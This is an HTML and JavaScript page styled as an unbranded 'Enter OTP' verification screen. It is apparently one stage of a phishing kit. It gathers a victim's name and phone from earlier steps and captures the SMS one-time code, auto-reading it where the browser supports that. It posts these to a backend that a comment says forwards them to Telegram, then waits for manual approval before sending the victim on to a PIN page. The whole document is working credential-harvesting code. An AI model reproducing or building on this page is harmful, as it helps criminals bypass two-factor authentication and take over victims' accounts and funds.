<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Enter OTP</title>

<style>
  body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background: #e5e5e5;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .card {
    background: #ffffff;
    width: 92%;
    max-width: 420px;
    border-radius: 12px;
    padding: 24px 20px 28px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
    position: relative;
  }

  .close {
    position: absolute;
    top: 14px;
    right: 14px;
    width: 28px;
    height: 28px;
    background: #e11b22;
    color: #fff;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: bold;
    cursor: pointer;
  }

  h1 {
    text-align: center;
    font-size: 22px;
    margin-bottom: 6px;
  }

  .info {
    text-align: center;
    font-size: 14px;
    color: #666;
    margin-bottom: 24px;
  }

  .otp-wrap {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 18px;
  }

  .otp-wrap input {
    width: 48px;
    height: 54px;
    text-align: center;
    font-size: 22px;
    border-radius: 8px;
    border: 1.5px solid #ddd;
    outline: none;
  }

  .otp-wrap input:focus {
    border-color: #e11b22;
  }

  .timer {
    text-align: center;
    font-size: 13px;
    color: #777;
    margin-bottom: 20px;
  }

  button {
    width: 100%;
    padding: 16px;
    font-size: 16px;
    background: #e11b22;
    color: #fff;
    border: none;
    border-radius: 999px;
    opacity: 0.5;
  }

  button:enabled {
    opacity: 1;
  }

  .resend {
    text-align: center;
    font-size: 14px;
    color: #999;
    margin-top: 18px;
  }

  .resend.active {
    color: #e11b22;
    cursor: pointer;
  }
</style>
</head>

<body>

<div class="card">
  <div class="close">✕</div>

  <h1>Enter OTP</h1>
  <div class="info">
    Please enter the OTP sent to verify your number
  </div>

  <div class="otp-wrap">
    <input type="tel" maxlength="1" inputmode="numeric">
    <input type="tel" maxlength="1" inputmode="numeric">
    <input type="tel" maxlength="1" inputmode="numeric">
    <input type="tel" maxlength="1" inputmode="numeric">
    <input type="tel" maxlength="1" inputmode="numeric">
    <input type="tel" maxlength="1" inputmode="numeric">
  </div>

  <div class="timer">
    You can resend OTP in <span id="countdown">120</span>
  </div>

  <button id="verifyBtn" disabled>Verify OTP</button>

  <div id="resend" class="resend">Resend in 02:00</div>
</div>

<script>
  const inputs = document.querySelectorAll('.otp-wrap input');
  const verifyBtn = document.getElementById('verifyBtn');
  const countdownEl = document.getElementById('countdown');
  const resendEl = document.getElementById('resend');

  const fullName = localStorage.getItem('fullName');
  const phone = localStorage.getItem('phone');

  if (!fullName || !phone) {
    alert('Session expired. Please start again.');
    window.location.href = 'index.html';
  }

  // ===== COUNTDOWN (UNCHANGED) =====
  let timeLeft = 120;

  function formatTime(sec) {
    const m = String(Math.floor(sec / 60)).padStart(2, '0');
    const s = String(sec % 60).padStart(2, '0');
    return `${m}:${s}`;
  }

  const timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;
    resendEl.textContent = `Resend in ${formatTime(timeLeft)}`;

    if (timeLeft <= 0) {
      clearInterval(timer);
      countdownEl.textContent = '0';
      resendEl.textContent = 'Resend OTP';
      resendEl.classList.add('active');
    }
  }, 1000);

  // ===== OTP COMPLETE → SEND TO TELEGRAM VIA BACKEND =====
  async function submitOtp(code) {
    try {
      const res = await fetch(`${window.location.origin}/submit-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: fullName,
          phone,
          otp: code
        })
      });

      const { requestId } = await res.json();
      pollApproval(requestId);

    } catch (e) {
      alert('Server error. Please try again.');
    }
  }

  function pollApproval(requestId) {
    const interval = setInterval(async () => {
      const res = await fetch(
        `${window.location.origin}/check-otp/${requestId}`
      );
      const data = await res.json();

      if (data.approved === true) {
        clearInterval(interval);
        window.location.href = 'pin.html';
      }

      if (data.approved === false) {
        clearInterval(interval);
        alert('OTP rejected. Please try again.');
        window.location.reload();
      }
    }, 2000);
  }

  function checkAndSubmit() {
    const code = Array.from(inputs).map(i => i.value).join('');
    if (code.length === 6) {
      verifyBtn.disabled = false;
      submitOtp(code);
    }
  }

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, '');
      if (input.value && inputs[index + 1]) {
        inputs[index + 1].focus();
      }
      checkAndSubmit();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && inputs[index - 1]) {
        inputs[index - 1].focus();
      }
    });
  });

  // ===== AUTO-PASTE OTP =====
  if ('OTPCredential' in window) {
    window.addEventListener('DOMContentLoaded', async () => {
      try {
        const otp = await navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: new AbortController().signal
        });

        if (otp && otp.code) {
          otp.code.split('').forEach((digit, i) => {
            if (inputs[i]) inputs[i].value = digit;
          });
          checkAndSubmit();
        }
      } catch (e) {}
    });
  }
</script>

</body>
</html>
